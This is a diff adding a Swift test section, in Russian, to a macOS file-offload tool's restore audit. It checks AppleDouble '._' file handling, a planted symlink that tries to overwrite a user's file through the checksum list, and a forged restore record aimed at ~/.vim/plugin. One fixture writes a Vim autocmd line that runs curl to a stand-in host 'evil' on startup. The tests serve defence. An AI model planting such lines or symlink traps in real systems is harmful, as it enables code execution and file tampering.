@@ -231,4 +231,57 @@ func checksHardenRestore() {
         check(fm.fileExists(atPath: liveHere.path), "идущее копирование на этом Mac не тронуто")
         check(fm.fileExists(atPath: downloads.appendingPathComponent("данные/file.txt").path), "данные вернулись на место")
     }
+
+    section("Аудит: настоящие «._»-файлы, подложенный список сумм, чужая запись в скрытую папку") {
+        let mount = try hardenMount("harden-audit.sparseimage", fs: "ExFAT", volumeName: "OFFAUDIT")
+        defer { _ = try? Runner.run("hdiutil", ["detach", "-force", mount.path], timeout: 60) }
+        guard let volume = Volumes.info(for: mount) else { throw CopyError.unreadable(mount.path) }
+        let rules = SafetyRules(home: scratch.appendingPathComponent("home-audit", isDirectory: true))
+        let mover = SafeMover(rules: rules)
+
+        // Файлы человека с именами на «._» рядом с одноимёнными: с FAT-флешки, из Windows. Один — просто
+        // данные, другой — в формате AppleDouble. Оба в списке сумм и обязаны вернуться.
+        let photos = rules.home.appendingPathComponent("Downloads/photos", isDirectory: true)
+        try write("jpeg", to: photos.appendingPathComponent("photo.jpg"))
+        try write("данные человека", to: photos.appendingPathComponent("._photo.jpg"))
+        try write("jpeg3", to: photos.appendingPathComponent("photo3.jpg"))
+        try Data([0x00, 0x05, 0x16, 0x07, 0x00, 0x02, 0x00, 0x00, 0x55]).write(to: photos.appendingPathComponent("._photo3.jpg"))
+        try write("jpeg2", to: photos.appendingPathComponent("photo2.jpg"))
+        let record = try mover.execute(mover.plan(source: photos, volume: volume), deleteOriginal: true, acceptCautions: true)
+        let archive = URL(fileURLWithPath: record.archivedPath)
+        // А этот двойник macOS «наплодила» уже на диске: его в списке нет, и возвращать его не надо.
+        try Data([0x00, 0x05, 0x16, 0x07, 0x00, 0x02, 0x00, 0x00]).write(to: archive.appendingPathComponent("._photo2.jpg"))
+        let outcome = try mover.restore(record, deleteArchive: true)
+        check(outcome.record.restored, "возврат прошёл: \(outcome.notes)")
+        check((try? String(contentsOf: photos.appendingPathComponent("._photo.jpg"), encoding: .utf8)) == "данные человека",
+              "настоящий файл «._photo.jpg» вернулся, а не удалён вместе с архивом")
+        check(fm.fileExists(atPath: photos.appendingPathComponent("._photo3.jpg").path),
+              "файл человека в формате AppleDouble из списка сумм вернулся")
+        check(!fm.fileExists(atPath: photos.appendingPathComponent("._photo2.jpg").path),
+              "служебный двойник, созданный macOS на диске, не вернулся")
+        check(!fm.fileExists(atPath: archive.path), "архив удалён после сверенного возврата")
+
+        // Подготовленный диск: на месте будущего списка сумм — ссылка на файл с Mac.
+        let victim = rules.home.appendingPathComponent("Documents/диплом.docx")
+        try write("мой диплом", to: victim)
+        let notes = rules.home.appendingPathComponent("Downloads/notes", isDirectory: true)
+        try write("заметки", to: notes.appendingPathComponent("a.txt"))
+        let trapFolder = mount.appendingPathComponent("Offload/Downloads", isDirectory: true)
+        try fm.createDirectory(at: trapFolder, withIntermediateDirectories: true)
+        try fm.createSymbolicLink(atPath: trapFolder.appendingPathComponent("notes.sha256").path, withDestinationPath: victim.path)
+        let moved = try mover.execute(mover.plan(source: notes, volume: volume), deleteOriginal: false, acceptCautions: true)
+        check((try? String(contentsOf: victim, encoding: .utf8)) == "мой диплом", "файл на Mac за подложенной ссылкой не перезаписан")
+        check(URL(fileURLWithPath: moved.archivedPath).lastPathComponent == "notes (2)",
+              "архив взял свободное имя вместе со спутниками: \(moved.archivedPath)")
+
+        // Запись только в журнале на диске, а путь — в скрытую папку программы (оговорка): не возвращаем.
+        let foreignArchive = mount.appendingPathComponent("Offload/plugin", isDirectory: true)
+        try write("autocmd VimEnter * !curl evil", to: foreignArchive.appendingPathComponent("x.vim"))
+        let foreign = MoveRecord(originalPath: rules.home.appendingPathComponent(".vim/plugin").path,
+                                 archivedPath: foreignArchive.path, volumeName: "OFFAUDIT", files: 1, bytes: 30, originalRemoved: true)
+        expectError("чужая запись с возвратом в скрытую папку программы отклоняется",
+                    { _ = try mover.restore(foreign, deleteArchive: false) },
+                    matching: { if case MoveError.unsafeRecord = $0 { return true }; return false })
+        check(!fm.fileExists(atPath: rules.home.appendingPathComponent(".vim").path), "в ~/.vim ничего не появилось")
+    }
 }
